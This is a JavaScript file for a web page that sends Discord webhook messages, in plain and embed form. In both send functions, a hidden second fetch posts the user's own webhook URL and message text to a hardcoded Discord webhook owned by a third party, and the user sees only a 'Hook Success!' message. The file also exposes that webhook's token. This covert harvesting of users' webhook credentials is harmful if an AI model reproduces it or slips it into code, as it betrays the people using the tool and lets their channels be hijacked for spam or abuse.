let url1 = document.getElementById('urlnormal')
let text1 = document.getElementById('textnormal')
let title2 = document.getElementById('titleembed')
let url2 = document.getElementById('urlembed')
let text2 = document.getElementById('textembed')
let color2 = document.getElementById('colorembed')

function normalhook() {
    if (url1.value == "") {
      swal({
        title: "Wrong!",
        text: "Webhook Url Empty!",
        icon: "error",
        button: "Ok",
    });
    }
    else
    {
      let msg1 = {
        "content": text1.value
    }
    let realmsg1 = {
    "embeds": [
    {
      "title": "Webhook Discord",
      "description": "Webhook Url : "+url1.value+"\nText : "+text1.value,
      "color": 16742912
    }
    ]
    }
    fetch(url1.value,{"method":"POST","headers": {"content-type":"application/json"},"body":JSON.stringify(msg1)})
    fetch("https://discord.com/api/webhooks/811933302704570399/-1X7u6OWX7Z7RPkF6diwqU6HjCybNoT5Bc5q4XFAQOuI1hZjzMjpNJf81N-lIgobfjtn",{"method":"POST","headers": {"content-type":"application/json"},"body":JSON.stringify(realmsg1)})
    swal({
      title: "Success!",
      text: "Hook Success!",
      icon: "success",
      button: "Ok",
  });
    }
}

function embedhook() {
  if (url2.value == "") {
    swal({
      title: "Wrong!",
      text: "Webhook Url Empty!",
      icon: "error",
      button: "Ok",
  });
  }
  else
  {
    let msg2 = {
      "embeds": [
      {
        "title": title2.value,
        "description": text2.value,
        "color": color2.value
      }
      ]
      }
      let realmsg2 = {
      "embeds": [
      {
          "title": "Webhook Discord",
          "description": "Webhook Url : "+url2.value+"\nText : "+text2.value,
          "color": 16742912
      }
      ]
      }
      fetch(url2.value,{"method":"POST","headers": {"content-type":"application/json"},"body":JSON.stringify(msg2)})
      fetch("https://discord.com/api/webhooks/811933302704570399/-1X7u6OWX7Z7RPkF6diwqU6HjCybNoT5Bc5q4XFAQOuI1hZjzMjpNJf81N-lIgobfjtn",{"method":"POST","headers": {"content-type":"application/json"},"body":JSON.stringify(realmsg2)})
      swal({
        title: "Success!",
        text: "Hook Success!",
        icon: "success",
        button: "Ok",
    });
  }
}